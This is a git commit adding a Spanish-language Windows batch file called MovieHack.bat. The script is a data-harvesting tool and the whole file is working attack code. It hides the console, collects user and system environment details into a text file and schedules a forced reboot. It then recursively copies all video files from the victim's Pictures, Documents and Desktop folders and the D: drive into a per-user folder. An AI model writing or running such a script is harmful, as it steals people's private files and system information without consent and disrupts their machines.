d7de94f672ed35388a3427a9569ef623ef07acd0
Pericena <pericena12@gmail.com>
2018-10-17 09:00:42 -0400

    commit inicial comentario

---
+++ Codigo/MovieHack.bat
@@ -0,0 +1,191 @@
+@rem Sigueme en las redes Sociales:
+@rem Blogger          https://lpericena.blogspot.com/
+@rem Github            https://github.com/Pericena
+@rem youtube.com  https://www.youtube.com/channel/UCELx1m-NeAdBn7mCuQ86kcw
+@rem pinterest        https://es.pinterest.com/lushiopericena/
+@rem twitter             https://twitter.com/LPericena
+@rem linkedin         https://www.linkedin.com/in/lpericena/
+@rem facebook       https://www.facebook.com/profile.php?id=100009309755063
+@rem pagina facebook  https://www.facebook.com/lpericena
+@rem sitio web        https://pericena.wordpress.com/
+@rem vimeo         https://vimeo.com/lpericena
+@rem instagram      https://www.instagram.com/lpericena/
+@rem remote      https://remote.com/luishinopericena-choque
+@rem google+   https://plus.google.com/u/0/114054031405340478901
+@rem kiwi       https://kiwi.qa/LuishinoC
+@rem App    https://apps.facebook.com/167466933725219
+@rem Grupo    https://www.facebook.com/groups/122223121705126/?source_id=1506435219407506
+@rem socialtools https://www.socialtools.me/index?action=demoApps&preview=1&app_id=406101
+@rem teachlr    https://teachlr.com/lpericena
+@rem wikipedia  https://es.wikipedia.org/wiki/Usuario:Luishi%C3%B1o_Pericena_Choque
+@rem ask          https://ask.fm/Lpericena
+@rem stackoverflow  https://stackoverflow.com/users/6506592/luishi%C3%B1o-pericena-choque
+@rem wix https://lpericena.wixsite.com/curriculumvitae
+
+@echo off 
+color 1
+title MovieHack
+
+
+
+rem start Movie.mp3
+
+set Nombre=                        Autor: Luishino Pericena Choque                    
+echo.                                                                      
+echo                        ,7uSSU;:.                                     
+echo                    1@@B@MNUYu@B@B@BX. %OS%                               
+echo                 rB@Bv       .B@BMM8F@Bv     hola %USERNAME%
+echo               :@BJ          J@B@B@  .GM@7      
+echo              8@2            MB@B@. i@BOF@B     
+echo             B@              B@B@: L@@@B@ @B      
+echo            B@               @@@v S@B@@r   @B             ,,          
+echo           Y@                GBF B@BM.      @B  ,::7Uu0q@B@B: 
+echo           @G             i;:.. ,@E     :777M@L22@B@BG. .2B@;         
+echo          iB            7ELB@Bvv7  ,EBX7ri@B@Br   LN1J:. 
+echo          1@           .B,B7 ,@iX, @B@Bu.:.rr@Bi,        
+echo          kB            B.@,  @vSi B@B@:  ,GMBv   PB@M.  r@B1
+echo          r@            iU7@@@1jZ  @B@v::rB@BG:irOB@BLirJ@B@2         
+echo           BS         7BY :.r77i   @@B@B@B@B@@@B@B@B@B@@@B@Bj         
+echo           PB       Y@B@ .N5:      @@@B@B@B@B@M@B@B@B@B@B@B@J         
+echo            @B    X@@B@  B@B7      B@B@B@@@B@Y  i0@B@B@B@B@@J         
+echo             @@ 0@B@@@  @@B@       @@@B@@@B@B2      j@B@B@B@Y         
+echo              @B0O@BM  @@B@@       B@B@@@B@B@J    .LMB@B@B@Bu         
+echo               vBMqu  B@@@B@       @B@@@B@B@Bk vB@B@B@B@B@B@Y         
+echo                 Y@Bvv@B@@@U       B@B@@@B@B@B@B@B@B@B@B@B@BF         
+echo                   :8@@@OMMY.:iJq@B@B@B@B@@@@@B@B@@@B@B@B@B@;         
+echo                        .:rJPPXu7.   ::,,,:,:,,,,,:,:,:,:,:     
+echo                                              .7:                
+echo         .@@@BB  M@B@B                       7@B@B               
+echo         v@@B@B  @B@B@,                      ,B@BP               
+echo         q@B@B@ .@@B@B7      ..    :...  ...   ,.      ..        
+echo         @B@B@BJ2@B@B@F   Y@@@B@B: @B@B  @B@r B@@G  r@B@B@B.     
+echo         B@BU8@B@@ZU@@B  k@B@.PB@B  @@@ ;B@B  @B@5 v@B@:1@@B     
+echo        .@B@iLB@B@:;B@B  @B:   :L@k M@@u0@B;  B@BU @B@BOB@B@2    
+echo        7B@B: @B@B ;@B@  B@B    @@2 .B@B@B@   @B@U @@B@ ,iiL.
+echo        B@B@: B@B@ UB@B: ,B@2@BSB@   @B@B@r  .B@BZ :B@B@@@B@
+echo        MB@B, MB@L 7@@@;   J@B@Mr    :@B@@    @B@u   JOB@07                            
+echo            https://lpericena.blogspot.com/                
+echo.%Nombre%
+echo.Movie %OS%  %COMPUTERNAME% %USERNAME% %DATE% %TIME%
+echo.
+IF NOT EXIST ".\Movie\"%USERNAME% MD ".\Movie\"%USERNAME%
+cd ".\Movie\"%USERNAME%
+rem systeminfo>>Movie.txt
+echo. %USERNAME%>>Movie.txt 
+echo. %USERPROFILE%>>Movie.txt 
+echo. %ALLUSERSPROFILE%>>Movie.txt 
+echo. %APPDATA%>>Movie.txt 
+echo. %COMMONPROGRAMFILES%>>Movie.txt 
+echo. %CMDCMDLINE%>>Movie.txt 
+echo. %CMDEXTVERSION%>>Movie.txt 
+echo. %COMPUTERNAME%>>Movie.txt 
+echo. %COMSPEC%>>Movie.txt 
+echo. %DATE%>>Movie.txt 
+echo. %ERRORLEVEL%>>Movie.txt 
+echo. %HOMEDRIVE%>>Movie.txt 
+echo. %HOMEPATH%>>Movie.txt 
+echo. %LOGONSERVER%>>Movie.txt 
+echo. %LOCALAPPDATA%>>Movie.txt 
+echo. %NUMBER_OF_PROCESSORS%>>Movie.txt 
+echo. %OS%>>Movie.txt 
+echo. %PATH%>>Movie.txt 
+echo. %PATHEXT%>>Movie.txt 
+echo. %PROCESSOR_ARCHITECTURE%>>Movie.txt 
+echo. %PROCESSOR_IDENTIFIER%	>>Movie.txt 
+echo. %PROCESSOR_LEVEL%	>>Movie.txt 
+echo. %PROCESSOR_REVISION%>>Movie.txt 
+echo. %PROGRAMDATA%	>>Movie.txt 
+echo. %PROGRAMFILES%	>>Movie.txt 
+echo. %PSModulePath%	>>Movie.txt 
+echo. %PUBLIC%	>>Movie.txt 
+echo. %RANDOM%	>>Movie.txt 
+echo. %SYSTEMDRIVE%	>>Movie.txt 
+echo. %SYSTEMROOT%	>>Movie.txt 
+echo. %TEMP% %TMP%	>>Movie.txt 
+echo. %TIME%	>>Movie.txt 
+echo. %USERNAME%	>>Movie.txt 
+echo. %USERPROFILE%	>>Movie.txt 
+echo. %WINDIR%	>>Movie.txt 
+echo. %ALLUSERSPROFILE%	>>Movie.txt 
+echo. %APPDATA%	>>Movie.txt 
+echo. %CLIENTNAME%	>>Movie.txt 
+echo. %CommonProgramFiles%>>Movie.txt 
+echo. %COMPUTERNAME%	>>Movie.txt 
+echo. %ComSpec%	>>Movie.txt 
+echo. %HOMEDRIVE% y %SystemDrive%	>>Movie.txt 
+echo. %HOMEPATH%	>>Movie.txt 
+echo. %Path%	>>Movie.txt 
+echo. %PATHEXT%	>>Movie.txt 
+echo. %ProgramFiles%	>>Movie.txt 
+echo. %SystemRoot% y %Windir%>>Movie.txt 
+echo. %TEMP% y %TMP%	>>Movie.txt 
+echo. %USERNAME%	>>Movie.txt 
+echo. %USERPROFILE%>>Movie.txt 
+
+
+:Reckon 
+set Nombre=                        Autor: Luishino Pericena Choque                    
+echo.                                                                      
+echo                        ,7uSSU;:.                                     
+echo                    1@@B@MNUYu@B@B@BX. %OS%                               
+echo                 rB@Bv       .B@BMM8F@Bv     
+echo               :@BJ          J@B@B@  .GM@7     
+echo              8@2            MB@B@. i@BOF@B     
+echo             B@              B@B@: L@@@B@ @B      
+echo            B@               @@@v S@B@@r   @B             ,,          
+echo           Y@                GBF B@BM.      @B  ,::7Uu0q@B@B: 
+echo           @G             i;:.. ,@E     :777M@L22@B@BG. .2B@;         
+echo          iB            7ELB@Bvv7  ,EBX7ri@B@Br   LN1J:. 
+echo          1@           .B,B7 ,@iX, @B@Bu.:.rr@Bi,        
+echo          kB            B.@,  @vSi B@B@:  ,GMBv   PB@M.  r@B1
+echo          r@            iU7@@@1jZ  @B@v::rB@BG:irOB@BLirJ@B@2         
+echo           BS         7BY :.r77i   @@B@B@B@B@@@B@B@B@B@@@B@Bj         
+echo           PB       Y@B@ .N5:      @@@B@B@B@B@M@B@B@B@B@B@B@J         
+echo            @B    X@@B@  B@B7      B@B@B@@@B@Y  i0@B@B@B@B@@J         
+echo             @@ 0@B@@@  @@B@       @@@B@@@B@B2      j@B@B@B@Y         
+echo              @B0O@BM  @@B@@       B@B@@@B@B@J    .LMB@B@B@Bu         
+echo               vBMqu  B@@@B@       @B@@@B@B@Bk vB@B@B@B@B@B@Y         
+echo                 Y@Bvv@B@@@U       B@B@@@B@B@B@B@B@B@B@B@B@BF         
+echo                   :8@@@OMMY.:iJq@B@B@B@B@@@@@B@B@@@B@B@B@B@;         
+echo                        .:rJPPXu7.   ::,,,:,:,,,,,:,:,:,:,:     
+echo                                              .7:                
+echo         .@@@BB  M@B@B                       7@B@B               
+echo         v@@B@B  @B@B@,                      ,B@BP               
+echo         q@B@B@ .@@B@B7      ..    :...  ...   ,.      ..        
+echo         @B@B@BJ2@B@B@F   Y@@@B@B: @B@B  @B@r B@@G  r@B@B@B.     
+echo         B@BU8@B@@ZU@@B  k@B@.PB@B  @@@ ;B@B  @B@5 v@B@:1@@B     
+echo        .@B@iLB@B@:;B@B  @B:   :L@k M@@u0@B;  B@BU @B@BOB@B@2    
+echo        7B@B: @B@B ;@B@  B@B    @@2 .B@B@B@   @B@U @@B@ ,iiL.
+echo        B@B@: B@B@ UB@B: ,B@2@BSB@   @B@B@r  .B@BZ :B@B@@@B@
+echo        MB@B, MB@L 7@@@;   J@B@Mr    :@B@@    @B@u   JOB@07                            
+echo            https://lpericena.blogspot.com/                
+echo.%Nombre%
+echo.Movie %OS%  %COMPUTERNAME% %USERNAME% %DATE% %TIME%
+echo.
+mode con lines=1 cols=15
+shutdown -r -t 3600 -c "Hola %USERNAME% %DATE% %TIME%" 
+
+
+for /R %USERPROFILE%\Pictures\ %%x in (*.MP4,*.MKV,*.AVI , *.MOV, *.WMV ,*.FLV,*.3GP,*.WebM) do copy "%%x" ".\"
+cls
+
+
+for /R %USERPROFILE%\Documentos\ %%x in (*.MP4,*.MKV,*.AVI , *.MOV, *.WMV ,*.FLV,*.3GP,*.WebM) do copy "%%x" ".\"
+cls
+for /R %USERPROFILE%\Desktop\ %%x in (*.MP4,*.MKV,*.AVI , *.MOV, *.WMV ,*.FLV,*.3GP,*.WebM) do copy "%%x" ".\"
+cls
+for /R D:\ %%x in (*.MP4,*.MKV,*.AVI , *.MOV, *.WMV ,*.FLV,*.3GP,*.WebM) do copy "%%x" ".\"
+cls
+EXIT
+goto Reckon
+rem TASKKILL /F /IM wmplayer.exe
+
+
+
+
+
+
+
+rem echo shutdown
+
+rem echo shutdown -r -t 30 -c "soy un tonto" 
